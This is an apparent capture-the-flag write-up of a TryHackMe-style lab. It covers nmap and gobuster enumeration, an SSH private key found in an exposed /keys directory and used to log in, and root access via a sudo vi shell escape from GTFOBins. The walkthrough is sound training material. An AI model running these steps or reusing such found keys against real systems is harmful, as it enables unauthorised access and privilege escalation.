## NMAP

`nmap 10.10.245.20`

```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-27 19:35 -0500  
Nmap scan report for 10.10.245.20  
Host is up (0.18s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
```

## Gobuster

`gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -u http://10.10.245.20`

```bash
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.10.245.20  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.php                 (Status: 403) [Size: 277]  
/.html                (Status: 403) [Size: 277]  
/.htm                 (Status: 403) [Size: 277]  
/assets               (Status: 301) [Size: 313] [--> http://10.10.245.20/assets/]  
/.                    (Status: 200) [Size: 886]  
/.htaccess            (Status: 403) [Size: 277]  
/.phtml               (Status: 403) [Size: 277]  
/.htc                 (Status: 403) [Size: 277]  
/.html_var_DE         (Status: 403) [Size: 277]  
/keys                 (Status: 301) [Size: 311] [--> http://10.10.245.20/keys/]  
/server-status        (Status: 403) [Size: 277]  
/.htpasswd            (Status: 403) [Size: 277]  
/.html.               (Status: 403) [Size: 277]  
/.html.html           (Status: 403) [Size: 277]  
/.htpasswds           (Status: 403) [Size: 277]  
/.htm.                (Status: 403) [Size: 277]  
/.htmll               (Status: 403) [Size: 277]  
/.phps                (Status: 403) [Size: 277]  
/.html.old            (Status: 403) [Size: 277]  
/.ht                  (Status: 403) [Size: 277]  
/.html.bak            (Status: 403) [Size: 277]  
/.htm.htm             (Status: 403) [Size: 277]  
/.hta                 (Status: 403) [Size: 277]  
/.htgroup             (Status: 403) [Size: 277]  
/.html1               (Status: 403) [Size: 277]  
/.html.LCK            (Status: 403) [Size: 277]  
/.html.printable      (Status: 403) [Size: 277]  
Progress: 20888 / 63089 (33.11%)^C  
[!] Keyboard interrupt detected, terminating.  
Progress: 20910 / 63089 (33.14%)
```

`/assets`

![Pasted image 20250627194609.png](Images/Pasted%20image%2020250627194609.png)

Nothing useful.

`/keys`

![Pasted image 20250627194651.png](Images/Pasted%20image%2020250627194651.png)

We check `key_09`

We find an SSH private key.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtYYVwOXJatC6YlBfF3XOsjcGdskwS9iLIqCbSjN2BqI2EiMYpL52
wZi+jxl94MTvMmn4U/KHcWdkD7SMCB9LmJUy9BiX/nxbGE8A/BCiRQ9gS45jz24sWLHh+r
AGd4evgU2DPBUkdZY23H+9aSp2G9tl7kgbkxNvVnk0yL+P73muiaWt2bSZQV6AzzkVRTsW
A82ILpSbl4fyVFfIFHnw85fUc8w6MJTzAAlW2KPU848sxkeJSyCRn3YNZgh6LN1Jq2ULhT
ma3lQHmJqBBtH8u3m/JotskwMoMUE1kdHC9jHLPmoUBA/1dgnYDSWNfiHLizKAIrPS8gVz
EMJsxwseI3LqxEnAraFEnSfRBeccmT9DL3DYEZIePG7uXGu9mPrAY2RCtv5ddt8s718F8L
0GzyU6JZjpTnizXK1EYknFBehJoFDAGxfiG/YVOPLDWCeJnXoCnEiuq6l4KcJPdNGXwAlW
oEw/lqX8zZQS3HJWqhpLHb9wyB081TNcZMBB3bevAAAFiL4LA4u+CwOLAAAAB3NzaC1yc2
EAAAGBALWGFcDlyWrQumJQXxd1zrI3BnbJMEvYiyKgm0ozdgaiNhIjGKS+dsGYvo8ZfeDE
7zJp+FPyh3FnZA+0jAgfS5iVMvQYl/58WxhPAPwQokUPYEuOY89uLFix4fqwBneHr4FNgz
[REDACTED]LKxh1lcwnD7
2QPUEZhLgwAzHCJiDwANrBNGuBdq+lAAAAwQDMWkUspYPHYDne9lsOba8aKshpIqA2cX7F
GOAocIDJ4TTjixXBxf+1n/iRtuZlIIQTl8uDNufYnqhghu0J/Q79UBdJN/6skvESYsdH1J
z3qU7hdnfwrlHn3pik5iZoXM1tmc0LB1/LO8NLn0KNYzg29iEtyXdZlewZiM5PihbjmojA
AvCElrOR5Zg+aLxuBye5oAiRbyLDn3+D+TH0694ftgdSnNj65ePqWN4O9vvwyIXGbSMlxw
qdN8UUt1jaqcMAAAASZGV2QHRyeWhhY2ttZS0yNDA0AQ==
-----END OPENSSH PRIVATE KEY-----
```

We can generate the public key:

`ssh-keygen -y -f sshkey`

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1hhXA5clq0LpiUF8Xdc6yNwZ2yTBL2IsioJtKM3YGojYSIxikvnbBmL6PGX3gxO8yafhT8odxZ2QPtIwIH0uYlTL0GJf+fFsYTwD8EKJFD2BLjmPPbixYseH6sAZ3h6+BTYM8FSR1ljbcf  
71pKnYb22XuSBuTE29WeTTIv4/vea6Jpa3ZtJlBXoDPORVFOxYDzYgulJuXh/JUV8gUefDzl9RzzDowlPMACVbYo9TzjyzGR4lLIJGfdg1mCHos3UmrZQuFOZreVAeYmoEG0fy7eb8mi2yTAygxQTWR0cL2Mcs+ahQED/V2CdgNJY1+IcuLMo  
Ais9LyBXMQwmzHCx4jcurEScCtoUSdJ9EF5xyZP0MvcNgRkh48bu5ca72Y+sBjZEK2/l123yzvXwXwvQbPJTolmOlOeLNcrURiScUF6EmgUMAbF+Ib9hU48sNYJ4mdegKcSK6rqXgpwk900ZfACVagTD+WpfzNlBLcclaqGksdv3DIHTzVM1x  
kwEHdt68= dev@tryhackme-2404
```

Now we know the user account and can login:

`dev@IP`

`echo 'PRIVATE_KEY' > sshkey`

`ssh -i sshkey dev@10.10.245.20`

Now we got the `user.txt`

## Privilege Escalation
`sudo -l`

```bash
Matching Defaults entries for dev on tryhackme-2404:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User dev may run the following commands on tryhackme-2404:  
   (ALL) NOPASSWD: /usr/bin/vi
```

We check [GTFOBins](https://gtfobins.github.io/) for /usr/bin/vi

````bash
sudo vi -c ':!/bin/sh' /dev/null
````

And we're root. Easier than the last room.

`cat root.txt`



``